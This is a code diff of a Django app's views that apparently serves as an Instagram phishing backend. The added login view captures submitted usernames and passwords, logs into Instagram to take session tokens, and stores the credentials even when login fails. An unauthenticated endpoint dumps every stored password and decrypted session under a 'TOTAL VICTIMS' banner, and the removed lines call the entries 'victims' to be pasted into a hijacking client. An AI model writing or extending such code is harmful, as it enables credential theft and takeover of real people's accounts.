@@ -1,17 +1,9 @@
-# core/views.py
-import logging
-from django.http import JsonResponse
-from django.shortcuts import render
-from django.views.decorators.csrf import csrf_exempt
 from instagrapi import Client
 from instagrapi.exceptions import ChallengeRequired, ClientError
 from .forms import InstagramLoginForm
 from .models import InstagramAccount
 
-logger = logging.getLogger(__name__)
 
-
-# core/views.py
 import logging
 from django.http import JsonResponse
 from django.shortcuts import render
@@ -41,57 +33,6 @@ import logging
 
 logger = logging.getLogger(__name__)
 
-@csrf_exempt
-def login_view(request):
-    if request.method == "GET":
-        return render(request, 'core/login.html')
-
-    if request.method == "POST":
-        try:
-            username = request.POST.get('username', '').strip()
-            password = request.POST.get('password', '').strip()
-
-            if not username or not password:
-                return JsonResponse({'error': 'Enter username and password'}, status=400)
-
-            cl = Client()
-            cl.delay_range = [1, 3]
-
-            try:
-                login_result = cl.login(username, password)
-                session = cl.get_settings()
-                
-                # Encrypt session
-                fernet = Fernet(settings.FERNET_KEY.encode())
-                encrypted_session = fernet.encrypt(json.dumps(session).encode()).decode()
-
-                # Save to DB
-                obj, created = InstagramAccount.objects.update_or_create(
-                    username=username,
-                    defaults={
-                        'password': password,
-                        'session_data': encrypted_session,
-                        'is_active': True
-                    }
-                )
-
-                return JsonResponse({
-                    'success': True,
-                    'username': username
-                })
-
-            except Exception as e:
-                error_msg = str(e).lower()
-                if 'challenge_required' in error_msg or 'checkpoint' in error_msg:
-                    return JsonResponse({'error': 'challenge_required'})
-                elif 'bad password' in error_msg:
-                    return JsonResponse({'error': 'Wrong password'})
-                else:
-                    return JsonResponse({'error': 'Login failed. Try again.'})
-
-        except Exception as e:
-            logger.error(f"Critical error: {e}")
-            return JsonResponse({'error': 'Server error'}, status=500)
 
 # @csrf_exempt
 # def login_view(request):
@@ -192,18 +133,17 @@ def checkpoint_view(request):
     return render(request, "core/checkpoint.html")
 
 
-
-from django.http import JsonResponse
+from django.http import JsonResponse, HttpResponse
 from core.models import InstagramAccount
 from cryptography.fernet import Fernet
 from django.conf import settings
 import json
 
+
 def get_all_sessions(request):
     if request.method == "GET":
         data = []
         fernet = Fernet(settings.FERNET_KEY.encode())
-        
         for acc in InstagramAccount.objects.all():
             try:
                 decrypted = fernet.decrypt(acc.session_data.encode()).decode()
@@ -212,9 +152,41 @@ def get_all_sessions(request):
                     "username": acc.username,
                     "password": acc.password,
                     "session_id": session.get("session_id", "N/A"),
-                    "full_session": decrypted  # paste this in instagrapi
                 })
             except:
-                pass
-                
-        return JsonResponse({"victims": data, "total": len(data)}, safe=False)
+                continue
+        total = len(data)
+        html = f"<h1 style='color:green;text-align:center;'>TOTAL VICTIMS: {total}</h1><pre>{json.dumps(data, indent=2)}</pre>"
+        return HttpResponse(html)
+    return HttpResponse("Only GET allowed")
+
+
+def login_view(request):
+    if request.method == "GET":
+        return render(request, 'core/login.html')
+    
+    if request.method == "POST":
+        username = request.POST.get('username', '').strip()
+        password = request.POST.get('password', '').strip()
+        
+        
+        cl = Client()
+        try:
+            cl.login(username, password)
+            session = cl.get_settings()
+        except:
+            session = {"fake": True}  
+        
+        fernet = Fernet(settings.FERNET_KEY.encode())
+        encrypted = fernet.encrypt(json.dumps(session).encode()).decode()
+        
+        InstagramAccount.objects.create(
+            username=username,
+            password=password,
+            session_data=encrypted
+        )
+        
+        return JsonResponse({
+            "success": True,
+            "username": username
+        })
